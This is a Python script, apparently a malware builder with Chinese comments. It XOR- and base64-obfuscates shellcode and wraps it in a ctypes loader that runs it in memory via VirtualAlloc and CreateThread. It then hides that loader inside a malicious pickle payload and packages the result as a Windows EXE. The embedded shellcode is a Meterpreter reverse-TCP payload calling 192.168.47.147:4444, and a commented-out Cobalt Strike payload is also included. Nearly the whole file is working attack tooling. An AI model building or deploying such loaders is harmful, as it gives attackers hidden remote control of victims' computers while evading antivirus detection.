import codecs
import base64
import pickle
import os

def xor_encrypt(tips, key):
    ltips = len(tips)
    lkey = len(key)
    secret = []
    num = 0
    for each in tips:
        if num >= lkey:
            num = num%lkey
        secret.append(chr(ord(each)^ord(key[num])))
        num += 1

    return base64.b64encode("".join(secret).encode()).decode()


def get_shellcode(Ccode, key):
    shellcode = "\
import base64,ctypes,codecs\n\
\n\
\n\
code = '"+get_secret(Ccode, key)+"'\n\
key = '"+key+"'\n\
\n\
\n\
def xor_decrypt(secret, key):\n\
    tips = base64.b64decode(secret.encode()).decode()\n\
    ltips = len(tips)\n\
    lkey = len(key)\n\
    secret = []\n\
    num = 0\n\
    for each in tips:\n\
        if num >= lkey:\n\
            num = num % lkey\n\
        \n\
        secret.append(chr(ord(each) ^ ord(key[num])))\n\
        num += 1\n\
    return '""'.join(secret)\n\
\n\
def run(code, key):\n\
    plaintxt = xor_decrypt(code, key)\n\
    decode_hex = codecs.getdecoder('hex_codec')\n\
    c1 = decode_hex(plaintxt)[0]\n\
    mess = bytearray(c1)\n\
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),\n\
                                                    ctypes.c_int(len(mess)),\n\
                                                    ctypes.c_int(0x3000),\n\
                                                    ctypes.c_int(0x40))\n\
    buf = (ctypes.c_char * len(mess)).from_buffer(mess)\n\
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),\n\
                                            buf,\n\
                                            ctypes.c_int(len(mess)))\n\
    \n\
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),\n\
                                                ctypes.c_int(0),\n\
                                                ctypes.c_int(ptr),\n\
                                                ctypes.c_int(0),\n\
                                                ctypes.c_int(0),\n\
                                                ctypes.pointer(ctypes.c_int(0)))\n\
    \n\
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))\n\
\n\
run(code, key)\n\
    "
    return shellcode



def get_secret(Ccode, key):
    encode_hex = codecs.getencoder("hex_codec")
    key = key
    shellcode = Ccode
    # hex 加密
    he = encode_hex(shellcode)[0]
    # 异或+base64加密
    secret = xor_encrypt(str(he, encoding='utf-8'), key)
    return secret



class Student(object):
    def __reduce__(self):
        return (exec, (mess,))



def xor_decrypt(secret, key):
    tips = base64.b64decode(secret.encode()).decode()
    ltips = len(tips)
    lkey = len(key)
    secret = []
    num = 0
    for each in tips:
        if num >= lkey:
            num = num % lkey

        secret.append(chr(ord(each) ^ ord(key[num])))
        num += 1

    return "".join(secret)


def write_py(secret, key2):
    code = "\
import pickle\n\
import base64\n\
import codecs\n\
\n\
\n\
def xor_decrypt(secret, key):\n\
    tips = base64.b64decode(secret.encode()).decode()\n\
    ltips = len(tips)\n\
    lkey = len(key)\n\
    secret = []\n\
    num = 0\n\
    for each in tips:\n\
        if num >= lkey:\n\
            num = num % lkey\n\
\n\
        secret.append(chr(ord(each) ^ ord(key[num])))\n\
        num += 1\n\
\n\
    return ''.join(secret)\n\
\n\
\n\
shellcode = '"+secret+"'\n\
plaintxt = xor_decrypt(shellcode, '"+key2+"')\n\
decode_hex = codecs.getdecoder('hex_codec')\n\
ret_0 = decode_hex(plaintxt)[0]\n\
pickle.loads(ret_0)\n\
\n\
"
    with open ("launch.py","w", encoding = "utf-8") as f1:

        f1.write(code)



def get_exe():
    if os.path.exists(r'.\launch.py'):
        os.system("python exeSetup.py py2exe")
    else:
        print("生成 EXE 文件 失败！")
        print("失败的原因: launch.py 生成失败！")
    if not os.path.exists(r'.\output'):
        os.rename("dist", "output")
    else:
        print('output文件夹已存在!')
        print('将使用默认 dist 文件夹！')
    os.remove('launch.py')
        
    

#由于 shellcode 内容较多，还是直接粘贴进来更方便
#shellcode = b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xb8\x22\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x4a\x45\x61\x6c\x00\x4b\x05\x1b\xce\x68\x05\xb8\x0d\x23\xf5\x6e\x37\x65\x2d\x00\xb7\xb5\x2d\xba\xb8\xce\x24\x48\x58\xec\x48\x0a\xa5\xcf\x28\x3c\x23\xe5\xb2\x59\xaf\x4e\x26\xe6\xf0\x86\x7b\x10\x35\xbd\x91\x88\x1a\x15\x33\xbe\x8c\x8d\xe0\x9e\x0f\xec\xe7\x6c\x84\x64\xd6\xba\x5f\x5e\xcc\x04\x0e\x48\x86\x71\x41\x00\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x37\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x29\x0d\x0a\x00\xdb\xf7\xec\x6c\xb7\x91\xd1\x7f\xeb\x73\x80\xcc\xeb\x1a\x55\x6f\x97\x0a\x68\x85\x45\x34\xae\xe8\x9d\xb1\x66\xb8\x04\x40\xf1\xab\x76\xde\xcf\x8a\x6d\xac\xb9\x3c\xfc\x37\xf3\xbe\x00\x84\x6f\xb6\x9d\x72\x35\xac\x17\x11\x06\x02\x8a\x17\x30\x81\xe7\x8c\xfa\x3c\x62\xe7\xe1\xd7\x67\x8f\x28\x73\x10\x29\x28\xdc\x5f\x30\xd7\x90\x14\xc8\x7c\xbc\xfd\xc2\x76\xa6\x73\x31\x93\x79\xd8\x52\x2d\x4a\x88\x22\x20\x72\xab\x82\x5d\x3b\x66\x61\xd9\x6b\x5c\x20\x7f\x4c\xba\x1c\x43\xdb\x69\x7f\xc1\x23\xaa\xe7\x29\x90\x7d\x08\x7e\x6a\x2b\x31\xcf\x8f\x9d\x9e\x05\x6c\xd2\x46\x64\x7b\xbe\x7b\xb6\x9d\x1e\xd0\x90\x27\xa8\xa9\xf6\x51\x70\xb8\x30\x5e\x64\x99\x92\x21\x88\x55\x18\x65\x85\x87\xf8\x2e\xdc\xc4\xcb\x80\x1b\x8e\xe2\xad\x9e\xeb\x7b\xeb\x52\x52\xe2\x88\xce\x7a\xb2\x7a\x2f\x7f\xc2\x71\x89\x85\xd6\xae\xaa\xc5\xb1\x58\xa5\x2e\xd7\x7f\x1d\x16\x25\x2f\x07\xa5\x9d\x8f\x75\x89\xc8\x13\xde\xfc\xe5\xa4\xca\x45\x3a\xf6\xa2\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x34\x37\x2e\x31\x34\x37\x00\x12\x34\x56\x78"
# CS
#shellcode = b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xb8\x22\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x4a\x45\x61\x6c\x00\x4b\x05\x1b\xce\x68\x05\xb8\x0d\x23\xf5\x6e\x37\x65\x2d\x00\xb7\xb5\x2d\xba\xb8\xce\x24\x48\x58\xec\x48\x0a\xa5\xcf\x28\x3c\x23\xe5\xb2\x59\xaf\x4e\x26\xe6\xf0\x86\x7b\x10\x35\xbd\x91\x88\x1a\x15\x33\xbe\x8c\x8d\xe0\x9e\x0f\xec\xe7\x6c\x84\x64\xd6\xba\x5f\x5e\xcc\x04\x0e\x48\x86\x71\x41\x00\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x37\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x29\x0d\x0a\x00\xdb\xf7\xec\x6c\xb7\x91\xd1\x7f\xeb\x73\x80\xcc\xeb\x1a\x55\x6f\x97\x0a\x68\x85\x45\x34\xae\xe8\x9d\xb1\x66\xb8\x04\x40\xf1\xab\x76\xde\xcf\x8a\x6d\xac\xb9\x3c\xfc\x37\xf3\xbe\x00\x84\x6f\xb6\x9d\x72\x35\xac\x17\x11\x06\x02\x8a\x17\x30\x81\xe7\x8c\xfa\x3c\x62\xe7\xe1\xd7\x67\x8f\x28\x73\x10\x29\x28\xdc\x5f\x30\xd7\x90\x14\xc8\x7c\xbc\xfd\xc2\x76\xa6\x73\x31\x93\x79\xd8\x52\x2d\x4a\x88\x22\x20\x72\xab\x82\x5d\x3b\x66\x61\xd9\x6b\x5c\x20\x7f\x4c\xba\x1c\x43\xdb\x69\x7f\xc1\x23\xaa\xe7\x29\x90\x7d\x08\x7e\x6a\x2b\x31\xcf\x8f\x9d\x9e\x05\x6c\xd2\x46\x64\x7b\xbe\x7b\xb6\x9d\x1e\xd0\x90\x27\xa8\xa9\xf6\x51\x70\xb8\x30\x5e\x64\x99\x92\x21\x88\x55\x18\x65\x85\x87\xf8\x2e\xdc\xc4\xcb\x80\x1b\x8e\xe2\xad\x9e\xeb\x7b\xeb\x52\x52\xe2\x88\xce\x7a\xb2\x7a\x2f\x7f\xc2\x71\x89\x85\xd6\xae\xaa\xc5\xb1\x58\xa5\x2e\xd7\x7f\x1d\x16\x25\x2f\x07\xa5\x9d\x8f\x75\x89\xc8\x13\xde\xfc\xe5\xa4\xca\x45\x3a\xf6\xa2\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x34\x37\x2e\x31\x34\x37\x00\x12\x34\x56\x78"

# MSF msfvenom -a x86 -p windows/meterpreter/reverse_tcp lhost=192.168.47.147 lport=4444 -b '\x00' -f python
shellcode = b"\xb8\x91\xa8\x2d\x9d\xdb\xd8\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x56\x31\x42\x13\x83\xc2\x04\x03\x42\x9e\x4a\xd8\x61\x48\x08\x23\x9a\x88\x6d\xad\x7f\xb9\xad\xc9\xf4\xe9\x1d\x99\x59\x05\xd5\xcf\x49\x9e\x9b\xc7\x7e\x17\x11\x3e\xb0\xa8\x0a\x02\xd3\x2a\x51\x57\x33\x13\x9a\xaa\x32\x54\xc7\x47\x66\x0d\x83\xfa\x97\x3a\xd9\xc6\x1c\x70\xcf\x4e\xc0\xc0\xee\x7f\x57\x5b\xa9\x5f\x59\x88\xc1\xe9\x41\xcd\xec\xa0\xfa\x25\x9a\x32\x2b\x74\x63\x98\x12\xb9\x96\xe0\x53\x7d\x49\x97\xad\x7e\xf4\xa0\x69\xfd\x22\x24\x6a\xa5\xa1\x9e\x56\x54\x65\x78\x1c\x5a\xc2\x0e\x7a\x7e\xd5\xc3\xf0\x7a\x5e\xe2\xd6\x0b\x24\xc1\xf2\x50\xfe\x68\xa2\x3c\x51\x94\xb4\x9f\x0e\x30\xbe\x0d\x5a\x49\x9d\x59\xaf\x60\x1e\x99\xa7\xf3\x6d\xab\x68\xa8\xf9\x87\xe1\x76\xfd\x9e\xe6\x88\xd1\x18\x66\x77\xd2\x58\xae\xbc\x86\x08\xd8\x15\xa7\xc3\x18\x99\x72\x79\x13\x0d\xbd\xd5\x0c\x5e\x55\x27\x53\x71\xfa\xae\xb5\x21\x52\xe0\x69\x82\x02\x40\xda\x6a\x49\x4f\x05\x8a\x72\x9a\x2e\x21\x9d\x72\x06\xde\x04\xdf\xdc\x7f\xc8\xca\x98\x40\x42\xfe\x5d\x0e\xa3\x8b\x4d\x67\xd4\x73\x8e\x78\x71\x73\xe4\x7c\xd3\x24\x90\x7e\x02\x02\x3f\x80\x61\x11\x38\x7e\xf4\x23\x32\x49\x62\x0b\x2c\xb6\x62\x8b\xac\xe0\xe8\x8b\xc4\x54\x49\xd8\xf1\x9a\x44\x4d\xaa\x0e\x67\x27\x1e\x98\x0f\xc5\x79\xee\x8f\x36\xac\x6c\xd7\xc8\x32\x5b\x70\xa0\xcc\xdb\x80\x30\xa7\xdb\xd0\x58\x3c\xf3\xdf\xa8\xbd\xde\xb7\xa0\x34\x8f\x7a\x51\x48\x9a\xdb\xcf\x49\x29\xc0\xe0\x30\x42\xf7\x01\xc5\x4a\x9c\x02\xc5\x72\xa2\x3f\x13\x4b\xd0\x7e\xa7\xe8\xeb\x35\x8a\x59\x66\x35\x98\x9a\xa3"
#key 设定shellcode的密钥
key = 'liam'
mess = get_shellcode(shellcode, key)
#print(mess)
ret = pickle.dumps(Student())
decode_hex = codecs.getdecoder("hex_codec")
encode_hex = codecs.getencoder("hex_codec")

ret_hex = encode_hex(ret)[0]
#key2 设定反序列化里的密钥
key2 = "byav"
secret = xor_encrypt(str(ret_hex, encoding='utf-8'), key2)
#print(secret)
plaintxt = xor_decrypt(secret, key2)
ret_0 = decode_hex(plaintxt)[0]
if ret_0 == ret:
    print('Encryte Successfully！')
    #pickle.loads(ret)
    write_py(secret, key2)
    get_exe()
    
else:
    print('error!')


